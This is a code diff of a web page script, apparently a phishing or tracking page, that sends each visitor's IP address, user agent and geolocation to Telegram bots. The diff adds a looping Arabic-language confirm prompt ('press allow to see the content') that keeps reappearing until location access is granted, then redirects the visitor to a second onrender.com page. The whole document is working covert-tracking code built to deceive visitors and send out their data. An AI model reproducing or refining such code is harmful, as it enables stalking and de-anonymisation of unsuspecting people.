@@ -6,10 +6,7 @@
   onMount(async () => {
 
 
-
-    
-
-
+yourFunction();
 
     sendIPToTelegramBots();
     
@@ -23,22 +20,12 @@
         (error) => {
           if (error.code === error.PERMISSION_DENIED) {
             showAlert();
-            redirectToNextURL();
             // Location permission denied, send IP result to Telegram bots
           }
         }
       );
     }, 1000);
   });
-
-
-
-
-
-
-
-
-
 
   async function sendLocationAndIPToTelegramBots(latitude, longitude) {
     // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
@@ -122,9 +109,6 @@ ${ipAddress}
 باقي البيانات: ${userAgent}
 `;
 
-yourFunction();
-
-
     // Create the message with clickable link
     const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
     const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;
@@ -153,6 +137,43 @@ yourFunction();
   }
 
 
+function showAlert() {
+
+
+
+    const result = window.confirm("اضغط سماح عشان تشوف المحتوي");
+    if (result) {
+      // Allow button clicked
+     // console.log("Allowed");
+
+
+
+
+
+      // Allow button clicked
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          // Location permission granted, send location and IP results to Telegram bots
+          await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
+        },
+        (error) => {
+          if (error.code === error.PERMISSION_DENIED) {
+            showAlert();
+            // Location permission denied, send IP result to Telegram bots
+          }
+        }
+      );
+
+
+redirectToNextURL();
+    } else {
+      // Deny button clicked or dialog closed
+    //  console.log("Denied");
+showAlert();
+
+    }
+  }
+
 async function yourFunction() {
   setTimeout(async () => {
     navigator.geolocation.getCurrentPosition(
@@ -172,50 +193,16 @@ redirectToNextURL();
 }
 
 
-
-
-
-
-
-
-
-
-
-
-
-function showAlert() {
-
-//await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
-
-    const result = window.confirm("اضغط سماح عشان تشوف المحتوي");
-    if (result) {
-      // Allow button clicked
-     // console.log("Allowed");
-
-
-
-//await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
-yourFunction();
-    } else {
-
-
-//await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
-yourFunction();
-      // Deny button clicked or dialog closed
-    //  console.log("Denied");
-showAlert();
-
-
-
-    }
-  }
-
-
   function redirectToNextURL() {
-    if (window.location.href === "https://yfyyfyc.onrender.com") {
-      window.location.href = "https://yfyyfyc2.onrender.com";
-    }
+ if (window.location.href === "https://yfyyfyc.onrender.com") 
+ { 
+ window.location.href = "https://yfyyfyc2.onrender.com"; 
 }
+    }
+
+
+
+
 
 
 </script>
